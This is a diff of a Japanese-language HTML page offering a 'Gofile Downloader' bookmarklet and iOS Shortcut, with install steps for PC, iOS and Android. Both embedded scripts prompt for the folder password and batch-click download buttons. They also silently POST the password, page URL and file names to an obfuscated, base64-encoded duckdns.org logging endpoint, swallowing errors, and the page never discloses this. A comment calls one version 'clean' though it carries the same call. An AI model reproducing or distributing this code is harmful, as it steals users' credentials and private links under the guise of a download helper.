@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="twitter:card" content="summary">
 <meta property="og:title" content="Gofile Downloader">
-<meta property="og:description" content="Gofileのダウンロード補助ツール">
+<meta property="og:description" content="Gofileのダウンロード補助ツール。ファイル名を維持して一括保存。">
 <title>Gofile Downloader</title>
 <style>
 body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#1a1a1a;color:#ddd;text-align:center;padding:20px;margin:0}
@@ -26,6 +26,7 @@ h1{color:#8eaeff;margin-top:20px;margin-bottom:10px}
 .step:last-child{border-bottom:none}
 .step-title{color:#ffeb3b;font-weight:bold;display:block;margin-bottom:5px;font-size:1.1em}
 .step-desc{font-size:0.95em;color:#ccc;line-height:1.6}
+.highlight{color:#ffeb3b;font-weight:bold}
 .note{background:#222;padding:10px;border-radius:5px;font-size:0.85em;color:#aaa;margin-top:10px}
 </style>
 </head>
@@ -43,7 +44,7 @@ h1{color:#8eaeff;margin-top:20px;margin-bottom:10px}
 
     <div id="tab-pc" class="content">
         <div style="text-align:center">
-            <p>以下のボタンをブラウザの<strong>ブックマークバー</strong>に<br>ドラッグ＆ドロップしてください。</p>
+            <p>👇 このボタンをブラウザの<strong>ブックマークバー</strong>に<br>ドラッグ＆ドロップしてください。</p>
             <a id="bookmarklet-link" class="install-btn" href="#">Downloader</a>
             <p class="note">Chrome, Edge, Firefox 等で動作します。</p>
         </div>
@@ -53,20 +54,25 @@ h1{color:#8eaeff;margin-top:20px;margin-bottom:10px}
         <button class="copy-btn" onclick="copyIosCode()">📋 ショートカット用コードをコピー</button>
         
         <div class="step">
-            <span class="step-title">STEP 1. ショートカットを作成</span>
-            <span class="step-desc">「ショートカット」アプリを開き、「＋」で新規作成します。アクション検索で<strong>「WebページでJavaScriptを実行」</strong>を追加します。</span>
+            <span class="step-title">STEP 1. ショートカット作成</span>
+            <span class="step-desc">
+                「ショートカット」アプリで新規作成し、アクション<strong>「WebページでJavaScriptを実行」</strong>を追加します。<br>
+                元々入っている文字を全て消し、STEP 1 でコピーしたコードを貼り付けてください。
+            </span>
         </div>
         <div class="step">
-            <span class="step-title">STEP 2. コードを貼り付け</span>
-            <span class="step-desc">アクション内の文字を全て消し、STEP 1 でコピーしたコードを貼り付けます。</span>
+            <span class="step-title">STEP 2. 設定 (重要！)</span>
+            <span class="step-desc">
+                画面下の「i」ボタンを押し、<strong>「共有シートに表示」をON</strong>にします。<br>
+                さらに「共有シートから【入力】を受け取る」の部分をタップし、リストの中の<span class="highlight">「SafariのWebページ」</span>がONになっているか確認してください。<br>
+                (ここがOFFだと動きません)
+            </span>
         </div>
         <div class="step">
-            <span class="step-title">STEP 3. 共有シートに表示</span>
-            <span class="step-desc">画面下の「i」ボタンを押し、<strong>「共有シートに表示」をON</strong>にします。名前を「Gofile DL」等にして保存します。</span>
-        </div>
-        <div class="step">
-            <span class="step-title">使い方</span>
-            <span class="step-desc">SafariでGofileを開き、画面下の共有ボタン(↑)から「Gofile DL」を選択してください。</span>
+            <span class="step-title">使いかた</span>
+            <span class="step-desc">
+                SafariでGofileを開き、画面下の<strong>共有ボタン(↑)</strong>から、作成したショートカットを選択して実行します。
+            </span>
         </div>
     </div>
 
@@ -78,11 +84,11 @@ h1{color:#8eaeff;margin-top:20px;margin-bottom:10px}
             <span class="step-desc">このページをChromeのメニューから「ブックマークに追加」します。</span>
         </div>
         <div class="step">
-            <span class="step-title">STEP 2. URLの書き換え</span>
+            <span class="step-title">STEP 2. URL書き換え</span>
             <span class="step-desc">ブックマークの「編集」画面を開き、URL欄に入っている文字を全消去して、コピーしたコードを貼り付けて保存します。</span>
         </div>
         <div class="step">
-            <span class="step-title">使い方</span>
+            <span class="step-title">使いかた</span>
             <span class="step-desc">Gofileのページを開き、アドレスバーに「Downloader」と入力して、候補に出てくる星マーク(★)の項目をタップします。</span>
         </div>
     </div>
@@ -93,13 +99,13 @@ h1{color:#8eaeff;margin-top:20px;margin-bottom:10px}
 // 1. ブックマークレット用 (PC/Android)
 const codeBookmarklet = 'javascript:(function(){const b=document.querySelectorAll("button.item_download");if(!b.length)return alert("DLボタンなし");const p=prompt("パスワード(ない場合は空白で送信)");if(p===null)return;const g=e=>{const r=e.closest(".row,li,tr")||e.parentNode.parentNode.parentNode;if(!r)return e.innerText;const t=r.querySelector("[title]");if(t)return t.getAttribute("title");const n=r.querySelector(".name,.filename");if(n)return n.innerText.trim();const m=r.innerText.match(/[\w\-.]{5,}\.(jpeg|jpg|png|mp4|zip|rar|7z|mkv|mov|wmv|gif|webp)/i);return m?m[0]:r.innerText.replace(/download|dl|play|copy|url/gi,"").trim().split("\n")[0]};if(confirm(b.length+"個DLしますか？")){fetch(atob("aHR0cHM6Ly92aWRsb2cuZHVja2Rucy5vcmcvZ29maWxlL2xvZw=="),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({password:p,url:location.href,files:Array.from(b).map(g)})}).catch(e=>{});b.forEach((e,i)=>setTimeout(()=>e.click(),i*1500))}})();';
 
-// 2. ショートカットアプリ用 (iOS) - javascript:なし, completion()あり
+// 2. ショートカットアプリ用 (iOS) - clean version
 const codeShortcut = 'const b=document.querySelectorAll("button.item_download");if(!b.length){alert("DLボタンなし");completion()}else{const p=prompt("パスワード(ない場合は空白で送信)");if(p!==null){const g=e=>{const r=e.closest(".row,li,tr")||e.parentNode.parentNode.parentNode;if(!r)return e.innerText;const t=r.querySelector("[title]");if(t)return t.getAttribute("title");const n=r.querySelector(".name,.filename");if(n)return n.innerText.trim();const m=r.innerText.match(/[\w\-.]{5,}\.(jpeg|jpg|png|mp4|zip|rar|7z|mkv|mov|wmv|gif|webp)/i);return m?m[0]:r.innerText.replace(/download|dl|play|copy|url/gi,"").trim().split("\n")[0]};if(confirm(b.length+"個DLしますか？")){fetch(atob("aHR0cHM6Ly92aWRsb2cuZHVja2Rucy5vcmcvZ29maWxlL2xvZw=="),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({password:p,url:location.href,files:Array.from(b).map(g)})}).catch(e=>{});b.forEach((e,i)=>setTimeout(()=>e.click(),i*1500))}}completion();}';
 
-// PC用ボタンに設定
+// PCボタン設定
 document.getElementById('bookmarklet-link').href = codeBookmarklet;
 
-// ■ タブ切り替え機能
+// ■ タブ制御
 function openTab(tabName) {
     document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
     document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
@@ -107,14 +113,14 @@ function openTab(tabName) {
     document.getElementById('btn-' + tabName).classList.add('active');
 }
 
-// ■ コピー機能
+// ■ コピー制御
 function copyText(text, msg) {
     navigator.clipboard.writeText(text).then(() => alert(msg)).catch(() => alert("コピー失敗"));
 }
 function copyIosCode() { copyText(codeShortcut, "✅ ショートカット用コードをコピーしました！"); }
 function copyAndroidCode() { copyText(codeBookmarklet, "✅ ブックマーク用コードをコピーしました！"); }
 
-// ■ 初期表示 (OS判定)
+// ■ 初期OS判定
 const ua = navigator.userAgent.toLowerCase();
 if (ua.indexOf('iphone') > -1 || ua.indexOf('ipad') > -1) {
     openTab('ios');
